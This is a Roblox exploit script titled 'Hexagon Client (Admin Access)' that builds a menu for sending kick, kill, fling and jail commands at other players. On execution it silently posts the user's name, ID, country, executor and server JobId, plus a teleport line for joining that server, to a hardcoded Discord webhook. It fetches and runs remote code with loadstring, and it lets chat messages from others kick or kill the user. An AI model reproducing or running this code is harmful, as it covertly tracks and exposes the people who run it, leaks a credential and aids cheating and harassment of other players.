local Players, RunService, ReplicatedStorage, StarterGui, UIS = game:GetService("Players"), game:GetService("RunService"), game:GetService("ReplicatedStorage"), game:GetService("StarterGui"), game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid, RootPart = Character:WaitForChild("Humanoid"), Character:WaitForChild("HumanoidRootPart")
local RE = ReplicatedStorage:WaitForChild("RE")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local TextChatService = game:GetService("TextChatService")

local function ExecuteLog()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local userId = LocalPlayer.UserId
    local dataHora = os.date("%d/%m/%Y %H:%M:%S")

    local avatarUrl
    pcall(function()
        avatarUrl = Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.AvatarFullBody, Enum.ThumbnailSize.Size150x150)
        if avatarUrl and not avatarUrl:match("^https://thumbnails%.roblox%.com/") then
            avatarUrl = nil
        end
    end)
    if not avatarUrl then
        avatarUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?usersIds=" .. userId .. "&format=Png&size=150x150" -- Fallback para imagem padr√£o
    end

    local data = {
        embeds = {{
            title = "üîß A player executed Hexagon",
            color = 7358325,
            image = {url = avatarUrl},
            fields = {
                {name = "üìÖ Date", value = dataHora, inline = false},
                {name = "üéÆ Game", value = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name, inline = false},
                {name = "üë§ Player", value = LocalPlayer.Name, inline = false},
                {name = "üÜî User ID", value = tostring(userId), inline = false},
                {name = "üìù Account Age", value = LocalPlayer.AccountAge .. " Days", inline = false},
                {name = "üåé Language", value = LocalPlayer.LocaleId, inline = false},
                {name = "üåé Country", value = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(LocalPlayer), inline = false},
                {name = "üíª Executor", value = identifyexecutor and identifyexecutor() or "Unknown", inline = false},
                {name = "üåê Server JobId", value = jobId, inline = false},
                {name = "üìå Teleport", value = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..placeId..", \""..jobId.."\")", inline = false},
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1433989880525881375/I9QncYRuM98BYQ1V3G0cGWb3ydd1IFAIJY_AHfMGkaDmCbl3HUA-ZbHHEB_vaoxx0QHK",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    end)
end

ExecuteLog()

local playerOldSpeed = {}
local jails = {}
local jailConnections = {}

local function sendCommand(command, aim)
    local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if ch then
        ch:SendAsync(";" .. command .. " " .. (aim or ""))
    end
end

local function processMessage(msgText, authorName)
    if not msgText or not authorName then return end

    local commandLower = msgText:lower()
    local targetLower = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    if commandLower:match(";kick%s+" .. targetLower) then
        LocalPlayer:Kick("You have been kicked by Hexagon Client")
    end

    if commandLower:match(";kill%s+" .. targetLower) then
        if character then character:BreakJoints() end
    end

    if commandLower:match("^;verify") then
        local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if ch then ch:SendAsync("Hexagon_####") end
    end
end

local function conectChannel(ch)
    if not ch or not ch.IsA then return end
    if not ch:IsA("TextChannel") then return end
    ch.MessageReceived:Connect(function(msg)
        local text = msg.Text
        local source = msg.TextSource and msg.TextSource.Name
        if text and source then
            processMessage(text, source)
        end
    end)
end

for _, tch in pairs(TextChatService.TextChannels:GetChildren()) do
    conectChannel(tch)
end
TextChatService.TextChannels.ChildAdded:Connect(function(tch)
    conectChannel(tch)
end)

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

WindUI.TransparencyValue = 0.2
WindUI:SetTheme("Midnight")

local Window = WindUI:CreateWindow({
    Title = "Hexagon Client (Admin Access)",
    Icon = "rbxassetid://108946066610871",
    Author = "Administrator ¬∑ " .. LocalPlayer.DisplayName,
    Size = UDim2.fromOffset(580,460),
    Transparent = true,
    Theme = "Midnight",
    Background = "rbxassetid://102266309145667",
    User = {
        Enabled = true,
        Anonymous = false,
        Callback = function()
            WindUI:Notify({
                Title = "User Profile",
                Content = "User profile clicked!",
                Duration = 3
            })
        end
    },
    HideSearchBar = false,
    SideBarWidth = 200,
})

Window:Tag({
    Title = "--:--",
    Color = WindUI:Gradient({
        ["0"]   = { Color = Color3.fromHex("#FF0F7B"), Transparency = 0 },
        ["100"] = { Color = Color3.fromHex("#F89B29"), Transparency = 0 },
    }),
})

Window:CreateTopbarButton("theme-switcher", "moon", function()
    WindUI:SetTheme(WindUI:GetCurrentTheme() == "Midnight" and "Light" or "Midnight")
    WindUI:Notify({
        Title = "Theme Changed",
        Content = "Current theme: "..WindUI:GetCurrentTheme(),
        Duration = 2
    })
end, 990)

local AdmTab = Window:Tab({ Title = "Admin", Icon = "crown" })
local Section = AdmTab:Section({ Title = "Admin Commands", Icon = "user-cog" })

local function getPlayersList()
local t = {}
for _, p in ipairs(Players:GetPlayers()) do
    table.insert(t, p.Name)
end
return t
end

local TargetName
local Dropdown = Section:Dropdown({
    Title = "Select Player",
    Values = getPlayersList(),
    Value = "",
    Callback = function(opt) TargetName = opt end
})

Players.PlayerAdded:Connect(function()
	Dropdown:SetValues(getPlayersList())
end)
Players.PlayerRemoving:Connect(function()
	Dropdown:SetValues(getPlayersList())
end)

local commands = { "verify","kick","kill","killplus","fling","freeze","unfreeze","jail","unjail" }
for _, cmd in ipairs(commands) do
Section:Button({
    Title = cmd:lower(),
    Desc = "Use ;"..cmd.." - Target",
    Callback = function()
        if cmd == "verify" then
			sendCommand("verify", "")
    	else
		if TargetName and TargetName ~= "" then
			sendCommand(cmd, TargetName)
		else
		warn("No player selected")
        end
    end
end
})
end
